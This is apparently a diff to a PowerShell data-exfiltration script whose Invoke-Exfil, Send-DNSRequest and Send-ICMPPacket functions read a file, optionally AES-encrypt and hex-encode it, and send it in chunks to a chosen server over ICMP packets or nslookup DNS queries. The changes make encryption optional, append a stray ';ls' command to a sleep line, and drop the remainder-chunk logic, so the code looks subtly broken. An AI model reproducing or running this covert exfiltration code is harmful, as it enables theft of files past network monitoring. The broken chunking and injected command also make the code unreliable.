@@ -16,7 +16,7 @@ function Send-ICMPPacket {
     $PingOptions.DontFragment = $True
     $sendbytes = ([text.encoding]::ASCII).GetBytes($data)
     $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
-    Start-Sleep -s 1;
+    Start-Sleep -s 1;;ls
 };
 
 function Send-DNSRequest {
@@ -27,11 +27,7 @@ function Send-DNSRequest {
     # get the size of the file and split it
     $repeat=[Math]::Floor($len/($split));
     $remainder=$len%$split;
-    if($remainder){ 
-        $repeat = $repeat + 1
-    };
-    
-    for($i=0; $i-lt$repeat; $i++){
+    for($i=0; $i-lt($repeat); $i++){
         $str = $data.Substring($i*$Split,$Split);
         $str = $jobid + $str + '.' + $dns;
         $q = nslookup -querytype=A $str $server;
@@ -52,7 +48,9 @@ function Invoke-Exfil {
     $hash = $hash -replace '-','';
     $IE = new-object -com internetexplorer.application;
     $data = [System.IO.File]::ReadAllBytes($file);
-    $data = AES $data
+    If ($key) {
+        $data = AES $data 
+    }
     $string = [System.BitConverter]::ToString($data);
     $string = $string -replace '-','';
     $filename = Split-Path $file -leaf
@@ -77,7 +75,6 @@ function Invoke-Exfil {
 
 
     If ($type -eq 'DNS') {
-
         $q = Send-DNSRequest $server $data $jobid
         for($i=0; $i-lt($repeat-1); $i++){
             $str = $string.Substring($i * $Split, $Split);
